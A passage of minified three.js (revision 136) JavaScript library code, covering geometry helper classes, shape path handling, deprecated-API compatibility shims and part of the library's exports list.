0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:16776960;_classCallCheck2(this,n);var o=a,s=new un;s.setAttribute("position",new en([1,-1,1,-1,1,1,-1,-1,1,1,1,1,-1,1,1,-1,-1,1,1,-1,1,1,1,1,0,0,1,0,0,0],3)),s.computeBoundingSphere(),(r=t.call(this,s,new So({color:o,toneMapped:!1}))).type="PlaneHelper",r.plane=e,r.size=i;var l=new un;return l.setAttribute("position",new en([1,1,1,-1,1,1,-1,-1,1,1,1,1,-1,-1,1,1,-1,1],3)),l.computeBoundingSphere(),r.add(new Bn(l,new zt({color:o,opacity:.2,transparent:!0,depthWrite:!1,toneMapped:!1}))),r}return _createClass2(n,[{key:"updateMatrixWorld",value:function(e){var t=-this.plane.constant;Math.abs(t)<1e-8&&(t=1e-8),this.scale.set(.5*this.size,.5*this.size,t),this.children[0].material.side=t<0?1:0,this.lookAt(this.plane.normal),_get2(_getPrototypeOf(n.prototype),"updateMatrixWorld",this).call(this,e)}}]),n}(),Ku=new ye,qu=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new ye(0,0,1),i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye(0,0,0),a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:16776960,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:.2*a,l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:.2*s;return _classCallCheck2(this,n),(e=t.call(this)).type="ArrowHelper",void 0===zu&&((zu=new un).setAttribute("position",new en([0,0,0,0,1,0],3)),(Hu=new Ko(0,.5,1,5,1)).translate(0,-.5,0)),e.position.copy(i),e.line=new Po(zu,new So({color:o,toneMapped:!1})),e.line.matrixAutoUpdate=!1,e.add(e.line),e.cone=new Bn(Hu,new zt({color:o,toneMapped:!1})),e.cone.matrixAutoUpdate=!1,e.add(e.cone),e.setDirection(r),e.setLength(a,s,l),e}return _createClass2(n,[{key:"setDirection",value:function(e){if(.99999<e.y)this.quaternion.set(0,0,0,1);else if(e.y<-.99999)this.quaternion.set(1,0,0,0);else{Ku.set(e.z,0,-e.x).normalize();var t=Math.acos(e.y);this.quaternion.setFromAxisAngle(Ku,t)}}},{key:"setLength",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:.2*e,n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:.2*t;this.line.scale.set(1,Math.max(1e-4,e-t),1),this.line.updateMatrix(),this.cone.scale.set(n,t,n),this.cone.position.y=e,this.cone.updateMatrix()}},{key:"setColor",value:function(e){this.line.material.color.set(e),this.cone.material.color.set(e)}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e,!1),this.line.copy(e.line),this.cone.copy(e.cone),this}}]),n}(),Xu=function(e){_inherits2(n,Lo);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1;_classCallCheck2(this,n);var i=[0,0,0,r,0,0,0,0,0,0,r,0,0,0,0,0,0,r],a=new un;a.setAttribute("position",new en(i,3)),a.setAttribute("color",new en([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1],3));var o=new So({vertexColors:!0,toneMapped:!1});return(e=t.call(this,a,o)).type="AxesHelper",e}return _createClass2(n,[{key:"setColors",value:function(e,t,n){var r=new $t,i=this.geometry.attributes.color.array;return r.set(e),r.toArray(i,0),r.toArray(i,3),r.set(t),r.toArray(i,6),r.toArray(i,9),r.set(n),r.toArray(i,12),r.toArray(i,15),this.geometry.attributes.color.needsUpdate=!0,this}},{key:"dispose",value:function(){this.geometry.dispose(),this.material.dispose()}}]),n}(),Yu=function(){function e(){_classCallCheck2(this,e),this.type="ShapePath",this.color=new $t,this.subPaths=[],this.currentPath=null}return _createClass2(e,[{key:"moveTo",value:function(e,t){return this.currentPath=new xs,this.subPaths.push(this.currentPath),this.currentPath.moveTo(e,t),this}},{key:"lineTo",value:function(e,t){return this.currentPath.lineTo(e,t),this}},{key:"quadraticCurveTo",value:function(e,t,n,r){return this.currentPath.quadraticCurveTo(e,t,n,r),this}},{key:"bezierCurveTo",value:function(e,t,n,r,i,a){return this.currentPath.bezierCurveTo(e,t,n,r,i,a),this}},{key:"splineThru",value:function(e){return this.currentPath.splineThru(e),this}},{key:"toShapes",value:function(e,t){function n(e){for(var t=[],n=0,r=e.length;n<r;n++){var i=e[n],a=new Ss;a.curves=i.curves,t.push(a)}return t}function r(e,t){for(var n=t.length,r=!1,i=n-1,a=0;a<n;i=a++){var o=t[i],s=t[a],l=s.x-o.x,c=s.y-o.y;if(Math.abs(c)>Number.EPSILON){if(c<0&&(o=t[a],l=-l,s=t[i],c=-c),e.y<o.y||e.y>s.y)continue;if(e.y===o.y){if(e.x===o.x)return!0}else{var u=c*(e.x-o.x)-l*(e.y-o.y);if(0===u)return!0;if(u<0)continue;r=!r}}else{if(e.y!==o.y)continue;if(s.x<=e.x&&e.x<=o.x||o.x<=e.x&&e.x<=s.x)return!0}}return r}var i,a,o,s=Ks.isClockWise,l=this.subPaths;if(0===l.length)return[];if(!0===t)return n(l);var c=[];if(1===l.length)return a=l[0],(o=new Ss).curves=a.curves,c.push(o),c;var u=!s(l[0].getPoints());u=e?!u:u;var d,p,h=[],f=[],A=[],m=0;f[m]=void 0,A[m]=[];for(var v=0,g=l.length;v<g;v++)i=s(d=(a=l[v]).getPoints()),(i=e?!i:i)?(!u&&f[m]&&m++,f[m]={s:new Ss,p:d},f[m].s.curves=a.curves,u&&m++,A[m]=[]):A[m].push({h:a,p:d[0]});if(!f[0])return n(l);if(1<f.length){for(var y=!1,b=[],_=0,w=f.length;_<w;_++)h[_]=[];for(var C=0,x=f.length;C<x;C++)for(var S=A[C],k=0;k<S.length;k++){for(var M=S[k],B=!0,E=0;E<f.length;E++)r(M.p,f[E].p)&&(C!==E&&b.push({froms:C,tos:E,hole:k}),B?(B=!1,h[E].push(M)):y=!0);B&&h[C].push(M)}0<b.length&&(y||(A=h))}for(var T=0,P=f.length;T<P;T++){o=f[T].s,c.push(o);for(var I=0,F=(p=A[T]).length;I<F;I++)o.holes.push(p[I].h)}return c}}]),e}(),Ju=new Float32Array(1),Zu=new Int32Array(Ju.buffer),ed=function(){function e(){_classCallCheck2(this,e)}return _createClass2(e,null,[{key:"toHalfFloat",value:function(e){65504<e&&(e=65504),Ju[0]=e;var t=Zu[0],n=t>>16&32768,r=t>>12&2047,i=t>>23&255;return i<103?n:142<i?(n|=31744,n|=(255==i?0:1)&&8388607&t):i<113?n|=((r|=2048)>>114-i)+(r>>113-i&1):(n|=i-112<<10|r>>1,n+=1&r)}}]),e}();rs.create=function(e,t){return e.prototype=Object.create(rs.prototype),(e.prototype.constructor=e).prototype.getPoint=t,e},xs.prototype.fromPoints=function(e){return this.setFromPoints(e)},Iu.prototype.setColors=function(){},ku.prototype.update=function(){},Ul.prototype.extractUrlBase=function(e){return Ac.extractUrlBase(e)},Ul.Handlers={add:function(){},get:function(){}},vu.prototype.center=function(e){return this.getCenter(e)},vu.prototype.empty=function(){return this.isEmpty()},vu.prototype.isIntersectionBox=function(e){return this.intersectsBox(e)},vu.prototype.size=function(e){return this.getSize(e)},we.prototype.center=function(e){return this.getCenter(e)},we.prototype.empty=function(){return this.isEmpty()},we.prototype.isIntersectionBox=function(e){return this.intersectsBox(e)},we.prototype.isIntersectionSphere=function(e){return this.intersectsSphere(e)},we.prototype.size=function(e){return this.getSize(e)},$e.prototype.empty=function(){return this.isEmpty()},Gn.prototype.setFromMatrix=function(e){return this.setFromProjectionMatrix(e)},bu.prototype.center=function(e){return this.getCenter(e)},ie.prototype.flattenToArrayOffset=function(e,t){return this.toArray(e,t)},ie.prototype.multiplyVector3=function(e){return e.applyMatrix3(this)},ie.prototype.multiplyVector3Array=function(){},ie.prototype.applyToBufferAttribute=function(e){return e.applyMatrix3(this)},ie.prototype.applyToVector3Array=function(){},ie.prototype.getInverse=function(e){return this.copy(e).invert()},Xe.prototype.extractPosition=function(e){return this.copyPosition(e)},Xe.prototype.flattenToArrayOffset=function(e,t){return this.toArray(e,t)},Xe.prototype.getPosition=function(){return(new ye).setFromMatrixColumn(this,3)},Xe.prototype.setRotationFromQuaternion=function(e){return this.makeRotationFromQuaternion(e)},Xe.prototype.multiplyToArray=function(){},Xe.prototype.multiplyVector3=function(e){return e.applyMatrix4(this)},Xe.prototype.multiplyVector4=function(e){return e.applyMatrix4(this)},Xe.prototype.multiplyVector3Array=function(){},Xe.prototype.rotateAxis=function(e){e.transformDirection(this)},Xe.prototype.crossVector=function(e){return e.applyMatrix4(this)},Xe.prototype.translate=function(){},Xe.prototype.rotateX=function(){},Xe.prototype.rotateY=function(){},Xe.prototype.rotateZ=function(){},Xe.prototype.rotateByAxis=function(){},Xe.prototype.applyToBufferAttribute=function(e){return e.applyMatrix4(this)},Xe.prototype.applyToVector3Array=function(){},Xe.prototype.makeFrustum=function(e,t,n,r,i,a){return this.makePerspective(e,t,r,n,i,a)},Xe.prototype.getInverse=function(e){return this.copy(e).invert()},Hn.prototype.isIntersectionLine=function(e){return this.intersectsLine(e)},ge.prototype.multiplyVector3=function(e){return e.applyQuaternion(this)},ge.prototype.inverse=function(){return this.invert()},qe.prototype.isIntersectionBox=function(e){return this.intersectsBox(e)},qe.prototype.isIntersectionPlane=function(e){return this.intersectsPlane(e)},qe.prototype.isIntersectionSphere=function(e){return this.intersectsSphere(e)},It.prototype.area=function(){return this.getArea()},It.prototype.barycoordFromPoint=function(e,t){return this.getBarycoord(e,t)},It.prototype.midpoint=function(e){return this.getMidpoint(e)},It.prototypenormal=function(e){return this.getNormal(e)},It.prototype.plane=function(e){return this.getPlane(e)},It.barycoordFromPoint=function(e,t,n,r,i){return It.getBarycoord(e,t,n,r,i)},It.normal=function(e,t,n,r){return It.getNormal(e,t,n,r)},Ss.prototype.extractAllPoints=function(e){return this.extractPoints(e)},Ss.prototype.extrude=function(e){return new Ys(this,e)},Ss.prototype.makeGeometry=function(e){return new rl(this,e)},re.prototype.fromAttribute=function(e,t,n){return this.fromBufferAttribute(e,t,n)},re.prototype.distanceToManhattan=function(e){return this.manhattanDistanceTo(e)},re.prototype.lengthManhattan=function(){return this.manhattanLength()},ye.prototype.setEulerFromRotationMatrix=function(){},ye.prototype.setEulerFromQuaternion=function(){},ye.prototype.getPositionFromMatrix=function(e){return this.setFromMatrixPosition(e)},ye.prototype.getScaleFromMatrix=function(e){return this.setFromMatrixScale(e)},ye.prototype.getColumnFromMatrix=function(e,t){return this.setFromMatrixColumn(t,e)},ye.prototype.applyProjection=function(e){return this.applyMatrix4(e)},ye.prototype.fromAttribute=function(e,t,n){return this.fromBufferAttribute(e,t,n)},ye.prototype.distanceToManhattan=function(e){return this.manhattanDistanceTo(e)},ye.prototype.lengthManhattan=function(){return this.manhattanLength()},fe.prototype.fromAttribute=function(e,t,n){return this.fromBufferAttribute(e,t,n)},fe.prototype.lengthManhattan=function(){return this.manhattanLength()},_t.prototype.getChildByName=function(e){return this.getObjectByName(e)},_t.prototype.renderDepth=function(){},_t.prototype.translate=function(e,t){return this.translateOnAxis(t,e)},_t.prototype.getWorldRotation=function(){},_t.prototype.applyMatrix=function(e){return this.applyMatrix4(e)},Object.defineProperties(_t.prototype,{eulerOrder:{get:function(){return this.rotation.order},set:function(e){this.rotation.order=e}},useQuaternion:{get:function(){},set:function(){}}}),Bn.prototype.setDrawMode=function(){},Object.defineProperties(Bn.prototype,{drawMode:{get:function(){return 0},set:function(){}}}),ho.prototype.initBones=function(){},Nn.prototype.setLens=function(e,t){void 0!==t&&(this.filmGauge=t),this.setFocalLength(e)},Object.defineProperties(ql.prototype,{onlyShadow:{set:function(){}},shadowCameraFov:{set:function(e){this.shadow.camera.fov=e}},shadowCameraLeft:{set:function(e){this.shadow.camera.left=e}},shadowCameraRight:{set:function(e){this.shadow.camera.right=e}},shadowCameraTop:{set:function(e){this.shadow.camera.top=e}},shadowCameraBottom:{set:function(e){this.shadow.camera.bottom=e}},shadowCameraNear:{set:function(e){this.shadow.camera.near=e}},shadowCameraFar:{set:function(e){this.shadow.camera.far=e}},shadowCameraVisible:{set:function(){}},shadowBias:{set:function(e){this.shadow.bias=e}},shadowDarkness:{set:function(){}},shadowMapWidth:{set:function(e){this.shadow.mapSize.width=e}},shadowMapHeight:{set:function(e){this.shadow.mapSize.height=e}}}),Object.defineProperties(Qt.prototype,{length:{get:function(){return this.array.length}},dynamic:{get:function(){return this.usage===$},set:function(){this.setUsage($)}}}),Qt.prototype.setDynamic=function(e){return this.setUsage(!0===e?$:U),this},Qt.prototype.copyIndicesArray=function(){},Qt.prototype.setArray=function(){},un.prototype.addIndex=function(e){this.setIndex(e)},un.prototype.addAttribute=function(e,t){return t&&t.isBufferAttribute||t&&t.isInterleavedBufferAttribute?"index"===e?(this.setIndex(t),this):this.setAttribute(e,t):this.setAttribute(e,new Qt(t,arguments[2]))},un.prototype.addDrawCall=function(e,t,n){this.addGroup(e,t)},un.prototype.clearDrawCalls=function(){this.clearGroups()},un.prototype.computeOffsets=function(){},un.prototype.removeAttribute=function(e){return this.deleteAttribute(e)},un.prototype.applyMatrix=function(e){return this.applyMatrix4(e)},Object.defineProperties(un.prototype,{drawcalls:{get:function(){return this.groups}},offsets:{get:function(){return this.groups}}}),ja.prototype.setDynamic=function(e){return this.setUsage(!0===e?$:U),this},ja.prototype.setArray=function(){},Ys.prototype.getArrays=function(){},Ys.prototype.addShapeList=function(){},Ys.prototype.addShape=function(){},Ra.prototype.dispose=function(){},lu.prototype.onUpdate=function(){return this},Object.defineProperties(Lt.prototype,{wrapAround:{get:function(){},set:function(){}},overdraw:{get:function(){},set:function(){}},wrapRGB:{get:function(){return new $t}},shading:{get:function(){},set:function(e){this.flatShading=1===e}},stencilMask:{get:function(){return this.stencilFuncMask},set:function(e){this.stencilFuncMask=e}},vertexTangents:{get:function(){},set:function(){}}}),Object.defineProperties(Ln.prototype,{derivatives:{get:function(){return this.extensions.derivatives},set:function(e){this.extensions.derivatives=e}}}),La.prototype.clearTarget=function(e,t,n,r){this.setRenderTarget(e),this.clear(t,n,r)},La.prototype.animate=function(e){this.setAnimationLoop(e)},La.prototype.getCurrentRenderTarget=function(){return this.getRenderTarget()},La.prototype.getMaxAnisotropy=function(){return this.capabilities.getMaxAnisotropy()},La.prototype.getPrecision=function(){return this.capabilities.precision},La.prototype.resetGLState=function(){return this.state.reset()},La.prototype.supportsFloatTextures=function(){return this.extensions.get("OES_texture_float")},La.prototype.supportsHalfFloatTextures=function(){return this.extensions.get("OES_texture_half_float")},La.prototype.supportsStandardDerivatives=function(){return this.extensions.get("OES_standard_derivatives")},La.prototype.supportsCompressedTextureS3TC=function(){return this.extensions.get("WEBGL_compressed_texture_s3tc")},La.prototype.supportsCompressedTexturePVRTC=function(){return this.extensions.get("WEBGL_compressed_texture_pvrtc")},La.prototype.supportsBlendMinMax=function(){return this.extensions.get("EXT_blend_minmax")},La.prototype.supportsVertexTextures=function(){return this.capabilities.vertexTextures},La.prototype.supportsInstancedArrays=function(){return this.extensions.get("ANGLE_instanced_arrays")},La.prototype.enableScissorTest=function(e){this.setScissorTest(e)},La.prototype.initMaterial=function(){},La.prototype.addPrePlugin=function(){},La.prototype.addPostPlugin=function(){},La.prototype.updateShadowMap=function(){},La.prototype.setFaceCulling=function(){},La.prototype.allocTextureUnit=function(){},La.prototype.setTexture=function(){},La.prototype.setTexture2D=function(){},La.prototype.setTextureCube=function(){},La.prototype.getActiveMipMapLevel=function(){return this.getActiveMipmapLevel()},Object.defineProperties(La.prototype,{shadowMapEnabled:{get:function(){return this.shadowMap.enabled},set:function(e){this.shadowMap.enabled=e}},shadowMapType:{get:function(){return this.shadowMap.type},set:function(e){this.shadowMap.type=e}},shadowMapCullFace:{get:function(){},set:function(){}},context:{get:function(){return this.getContext()}},vr:{get:function(){return this.xr}},gammaInput:{get:function(){return!1},set:function(){}},gammaOutput:{get:function(){return!1},set:function(e){this.outputEncoding=!0===e?j:R}},toneMappingWhitePoint:{get:function(){return 1},set:function(){}},gammaFactor:{get:function(){return 2},set:function(){}}}),Object.defineProperties(Ca.prototype,{cullFace:{get:function(){},set:function(){}},renderReverseSided:{get:function(){},set:function(){}},renderSingleSided:{get:function(){},set:function(){}}}),Object.defineProperties(Ae.prototype,{wrapS:{get:function(){return this.texture.wrapS},set:function(e){this.texture.wrapS=e}},wrapT:{get:function(){return this.texture.wrapT},set:function(e){this.texture.wrapT=e}},magFilter:{get:function(){return this.texture.magFilter},set:function(e){this.texture.magFilter=e}},minFilter:{get:function(){return this.texture.minFilter},set:function(e){this.texture.minFilter=e}},anisotropy:{get:function(){return this.texture.anisotropy},set:function(e){this.texture.anisotropy=e}},offset:{get:function(){return this.texture.offset},set:function(e){this.texture.offset=e}},repeat:{get:function(){return this.texture.repeat},set:function(e){this.texture.repeat=e}},format:{get:function(){return this.texture.format},set:function(e){this.texture.format=e}},type:{get:function(){return this.texture.type},set:function(e){this.texture.type=e}},generateMipmaps:{get:function(){return this.texture.generateMipmaps},set:function(e){this.texture.generateMipmaps=e}}}),jc.prototype.load=function(e){var t=this;return(new Sc).load(e,(function(e){t.setBuffer(e)})),this},Qc.prototype.getData=function(){return this.getFrequencyData()},Dn.prototype.updateCubeMap=function(e,t){return this.update(e,t)},Dn.prototype.clear=function(e,t,n,r){return this.renderTarget.clear(e,t,n,r)},ue.crossOrigin=void 0,ue.loadTexture=function(e,t,n,r){var i=new Kl;i.setCrossOrigin(this.crossOrigin);var a=i.load(e,n,void 0,r);return t&&(a.mapping=t),a},ue.loadTextureCube=function(e,t,n,r){var i=new Gl;i.setCrossOrigin(this.crossOrigin);var a=i.load(e,n,void 0,r);return t&&(a.mapping=t),a},ue.loadCompressedTexture=function(){},ue.loadCompressedTextureCube=function(){};"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("register",{detail:{revision:"136"}})),"undefined"!=typeof window&&(window.__THREE__||(window.__THREE__="136")),e.ACESFilmicToneMapping=4,e.AddEquation=n,e.AddOperation=2,e.AdditiveAnimationBlendMode=2501,e.AdditiveBlending=2,e.AlphaFormat=1021,e.AlwaysDepth=1,e.AlwaysStencilFunc=519,e.AmbientLight=uc,e.AmbientLightProbe=Mc,e.AnimationClip=Ol,e.AnimationLoader=Hl,e.AnimationMixer=su,e.AnimationObjectGroup=au,e.AnimationUtils=wl,e.ArcCurve=as,e.ArrayCamera=Ma,e.ArrowHelper=qu,e.Audio=jc,e.AudioAnalyser=Qc,e.AudioContext=xc,e.AudioListener=Rc,e.AudioLoader=Sc,e.AxesHelper=Xu,e.AxisHelper=function(e){return new Xu(e)},e.BackSide=1,e.BasicDepthPacking=3200,e.BasicShadowMap=0,e.BinaryTextureLoader=function(e){return new Wl(e)},e.Bone=fo,e.BooleanKeyframeTrack=Bl,e.BoundingBoxHelper=function(e,t){return new Qu(e,t)},e.Box2=vu,e.Box3=we,e.Box3Helper=Gu,e.BoxBufferGeometry=Tn,e.BoxGeometry=Tn,e.BoxHelper=Qu,e.BufferAttribute=Qt,e.BufferGeometry=un,e.BufferGeometryLoader=gc,e.ByteType=1010,e.Cache=Dl,e.Camera=On,e.CameraHelper=Uu,e.CanvasRenderer=function(){},e.CanvasTexture=Go,e.CatmullRomCurve3=ds,e.CineonToneMapping=3,e.CircleBufferGeometry=Wo,e.CircleGeometry=Wo,e.ClampToEdgeWrapping=u,e.Clock=Ic,e.Color=$t,e.ColorKeyframeTrack=El,e.CompressedTexture=Qo,e.CompressedTextureLoader=Vl,e.ConeBufferGeometry=qo,e.ConeGeometry=qo,e.CubeCamera=Dn,e.CubeReflectionMapping=r,e.CubeRefractionMapping=i,e.CubeTexture=Rn,e.CubeTextureLoader=Gl,e.CubeUVReflectionMapping=s,e.CubeUVRefractionMapping=l,e.CubicBezierCurve=As,e.CubicBezierCurve3=ms,e.CubicInterpolant=xl,e.CullFaceBack=1,e.CullFaceFront=2,e.CullFaceFrontBack=3,e.CullFaceNone=0,e.Curve=rs,e.CurvePath=Cs,e.CustomBlending=5,e.CustomToneMapping=5,e.CylinderBufferGeometry=Ko,e.CylinderGeometry=Ko,e.Cylindrical=Au,e.DataTexture=Ao,e.DataTexture2DArray=Pr,e.DataTexture3D=Dr,e.DataTextureLoader=Wl,e.DataUtils=ed,e.DecrementStencilOp=7683,e.DecrementWrapStencilOp=34056,e.DefaultLoadingManager=jl,e.DepthFormat=k,e.DepthStencilFormat=M,e.DepthTexture=Pa,e.DirectionalLight=cc,e.DirectionalLightHelper=Du,e.DiscreteInterpolant=kl,e.DodecahedronBufferGeometry=Yo,e.DodecahedronGeometry=Yo,e.DoubleSide=2,e.DstAlphaFactor=206,e.DstColorFactor=208,e.DynamicBufferAttribute=function(e,t){return new Qt(e,t).setUsage($)},e.DynamicCopyUsage=35050,e.DynamicDrawUsage=$,e.DynamicReadUsage=35049,e.EdgesGeometry=ns,e.EdgesHelper=function(e,t){return new Lo(new ns(e.geometry),new So({color:void 0!==t?t:16777215}))},e.EllipseCurve=is,e.EqualDepth=4,e.EqualStencilFunc=514,e.EquirectangularReflectionMapping=a,e.EquirectangularRefractionMapping=o,e.Euler=ot,e.EventDispatcher=H,e.ExtrudeBufferGeometry=Ys,e.ExtrudeGeometry=Ys,e.FaceColors=1,e.FileLoader=zl,e.FlatShading=1,e.Float16BufferAttribute=Zt,e.Float32Attribute=function(e,t){return new en(e,t)},e.Float32BufferAttribute=en,e.Float64Attribute=function(e,t){return new tn(e,t)},e.Float64BufferAttribute=tn,e.FloatType=_,e.Fog=Da,e.FogExp2=Na,e.Font=function(){},e.FontLoader=function(){},e.FramebufferTexture=Vo,e.FrontSide=0,e.Frustum=Gn,e.GLBufferAttribute=uu,e.GLSL1="100",e.GLSL3=z,e.GreaterDepth=6,e.GreaterEqualDepth=5,e.GreaterEqualStencilFunc=518,e.GreaterStencilFunc=516,e.GridHelper=Iu,e.Group=Ba,e.HalfFloatType=w,e.HemisphereLight=Xl,e.HemisphereLightHelper=Pu,e.HemisphereLightProbe=kc,e.IcosahedronBufferGeometry=Zs,e.IcosahedronGeometry=Zs,e.ImageBitmapLoader=Cc,e.ImageLoader=Ql,e.ImageUtils=ue,e.ImmediateRenderObject=function(){},e.IncrementStencilOp=7682,e.IncrementWrapStencilOp=34055,e.InstancedBufferAttribute=yo,e.InstancedBufferGeometry=mc,e.InstancedInterleavedBuffer=cu,e.InstancedMesh=xo,e.Int16Attribute=function(e,t){return new qt(e,t)},e.Int16BufferAttribute=qt,e.Int32Attribute=function(e,t){return new Yt(e,t)},e.Int32BufferAttribute=Yt,e.Int8Attribute=function(e,t){return new Gt(e,t)},e.Int8BufferAttribute=Gt,e.IntType=1013,e.InterleavedBuffer=ja,e.InterleavedBufferAttribute=$a,e.Interpolant=Cl,e.InterpolateDiscrete=2300,e.InterpolateLinear=2301,e.InterpolateSmooth=2302,e.InvertStencilOp=5386,e.JSONLoader=function(){},e.KeepStencilOp=7680,e.KeyframeTrack=Ml,e.LOD=oo,e.LatheBufferGeometry=el,e.LatheGeometry=el,e.Layers=st,e.LensFlare=function(){},e.LessDepth=2,e.LessEqualDepth=3,e.LessEqualStencilFunc=515,e.LessStencilFunc=513,e.Light=ql,e.LightProbe=hc,e.Line=Po,e.Line3=bu,e.LineBasicMaterial=So,e.LineCurve=vs,e.LineCurve3=gs,e.LineDashedMaterial=bl,e.LineLoop=Oo,e.LinePieces=1,e.LineSegments=Lo,e.LineStrip=0,e.LinearEncoding=R,e.LinearFilter=A,e.LinearInterpolant=Sl,e.LinearMipMapLinearFilter=1008,e.LinearMipMapNearestFilter=1007,e.LinearMipmapLinearFilter=v,e.LinearMipmapNearestFilter=m,e.LinearToneMapping=1,e.Loader=Ul,e.LoaderUtils=Ac,e.LoadingManager=Rl,e.LoopOnce=2200,e.LoopPingPong=2202,e.LoopRepeat=2201,e.LuminanceAlphaFormat=1025,e.LuminanceFormat=1024,e.MOUSE={LEFT:0,MIDDLE:1,RIGHT:2,ROTATE:0,DOLLY:1,PAN:2},e.Material=Lt,e.MaterialLoader=fc,e.Math=ne,e.MathUtils=ne,e.Matrix3=ie,e.Matrix4=Xe,e.MaxEquation=104,e.Mesh=Bn,e.MeshBasicMaterial=zt,e.MeshDepthMaterial=_a,e.MeshDistanceMaterial=wa,e.MeshFaceMaterial=function(e){return e},e.MeshLambertMaterial=gl,e.MeshMatcapMaterial=yl,e.MeshNormalMaterial=vl,e.MeshPhongMaterial=Al,e.MeshPhysicalMaterial=fl,e.MeshStandardMaterial=hl,e.MeshToonMaterial=ml,e.MinEquation=103,e.MirroredRepeatWrapping=d,e.MixOperation=1,e.MultiMaterial=function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[];return e.isMultiMaterial=!0,(e.materials=e).clone=function(){return e.slice()},e},e.MultiplyBlending=4,e.MultiplyOperation=0,e.NearestFilter=p,e.NearestMipMapLinearFilter=1005,e.NearestMipMapNearestFilter=1004,e.NearestMipmapLinearFilter=f,e.NearestMipmapNearestFilter=h,e.NeverDepth=0,e.NeverStencilFunc=512,e.NoBlending=0,e.NoColors=0,e.NoToneMapping=0,e.NormalAnimationBlendMode=2500,e.NormalBlending=1,e.NotEqualDepth=7,e.NotEqualStencilFunc=517,e.NumberKeyframeTrack=Tl,e.Object3D=_t,e.ObjectLoader=yc,e.ObjectSpaceNormalMap=1,e.OctahedronBufferGeometry=tl,e.OctahedronGeometry=tl,e.OneFactor=201,e.OneMinusDstAlphaFactor=207,e.OneMinusDstColorFactor=209,e.OneMinusSrcAlphaFactor=205,e.OneMinusSrcColorFactor=203,e.OrthographicCamera=ar,e.PCFShadowMap=1,e.PCFSoftShadowMap=2,e.PMREMGenerator=_r,e.ParametricGeometry=function(){return new un},e.Particle=function(e){return new no(e)},e.ParticleBasicMaterial=function(e){return new No(e)},e.ParticleSystem=function(e,t){return new $o(e,t)},e.ParticleSystemMaterial=function(e){return new No(e)},e.Path=xs,e.PerspectiveCamera=Nn,e.Plane=Hn,e.PlaneBufferGeometry=qn,e.PlaneGeometry=qn,e.PlaneHelper=Wu,e.PointCloud=function(e,t){return new $o(e,t)},e.PointCloudMaterial=function(e){return new No(e)},e.PointLight=sc,e.PointLightHelper=Mu,e.Points=$o,e.PointsMaterial=No,e.PolarGridHelper=Fu,e.PolyhedronBufferGeometry=Xo,e.PolyhedronGeometry=Xo,e.PositionalAudio=Vc,e.PropertyBinding=iu,e.PropertyMixer=Gc,e.QuadraticBezierCurve=ys,e.QuadraticBezierCurve3=bs,e.Quaternion=ge,e.QuaternionKeyframeTrack=Il,e.QuaternionLinearInterpolant=Pl,e.REVISION="136",e.RGBADepthPacking=3201,e.RGBAFormat=S,e.RGBAIntegerFormat=1033,e.RGBA_ASTC_10x10_Format=37819,e.RGBA_ASTC_10x5_Format=37816,e.RGBA_ASTC_10x6_Format=37817,e.RGBA_ASTC_10x8_Format=37818,e.RGBA_ASTC_12x10_Format=37820,e.RGBA_ASTC_12x12_Format=37821,e.RGBA_ASTC_4x4_Format=37808,e.RGBA_ASTC_5x4_Format=37809,e.RGBA_ASTC_5x5_Format=37810,e.RGBA_ASTC_6x5_Format=37811,e.RGBA_ASTC_6x6_Format=37812,e.RGBA_ASTC_8x5_Format=37813,e.RGBA_ASTC_8x6_Format=37814,e.RGBA_ASTC_8x8_Format=37815,e.RGBA_BPTC_Format=36492,e.RGBA_ETC2_EAC_Format=D,e.RGBA_PVRTC_2BPPV1_Format=O,e.RGBA_PVRTC_4BPPV1_Format=L,e.RGBA_S3TC_DXT1_Format=E,e.RGBA_S3TC_DXT3_Format=T,e.RGBA_S3TC_DXT5_Format=P,e.RGBFormat=x,e.RGBIntegerFormat=1032,e.RGB_ETC1_Format=36196,e.RGB_ETC2_Format=N,e.RGB_PVRTC_2BPPV1_Format=F,e.RGB_PVRTC_4BPPV1_Format=I,e.RGB_S3TC_DXT1_Format=B,e.RGFormat=1030,e.RGIntegerFormat=1031,e.RawShaderMaterial=or,e.Ray=qe,e.Raycaster=du,e.RectAreaLight=dc,e.RedFormat=1028,e.RedIntegerFormat=1029,e.ReinhardToneMapping=2,e.RepeatWrapping=c,e.ReplaceStencilOp=7681,e.ReverseSubtractEquation=102,e.RingBufferGeometry=nl,e.RingGeometry=nl,e.SRGB8_ALPHA8_ASTC_10x10_Format=37851,e.SRGB8_ALPHA8_ASTC_10x5_Format=37848,e.SRGB8_ALPHA8_ASTC_10x6_Format=37849,e.SRGB8_ALPHA8_ASTC_10x8_Format=37850,e.SRGB8_ALPHA8_ASTC_12x10_Format=37852,e.SRGB8_ALPHA8_ASTC_12x12_Format=37853,e.SRGB8_ALPHA8_ASTC_4x4_Format=37840,e.SRGB8_ALPHA8_ASTC_5x4_Format=37841,e.SRGB8_ALPHA8_ASTC_5x5_Format=37842,e.SRGB8_ALPHA8_ASTC_6x5_Format=37843,e.SRGB8_ALPHA8_ASTC_6x6_Format=37844,e.SRGB8_ALPHA8_ASTC_8x5_Format=37845,e.SRGB8_ALPHA8_ASTC_8x6_Format=37846,e.SRGB8_ALPHA8_ASTC_8x8_Format=37847,e.Scene=Ra,e.SceneUtils={createMultiMaterialObject:function(){},detach:function(){},attach:function(){}},e.ShaderChunk=Xn,e.ShaderLib=Jn,e.ShaderMaterial=Ln,e.ShadowMaterial=pl,e.Shape=Ss,e.ShapeBufferGeometry=rl,e.ShapeGeometry=rl,e.ShapePath=Yu,e.ShapeUtils=Ks,e.ShortType=1011,e.Skeleton=go,e.SkeletonHelper=ku,e.SkinnedMes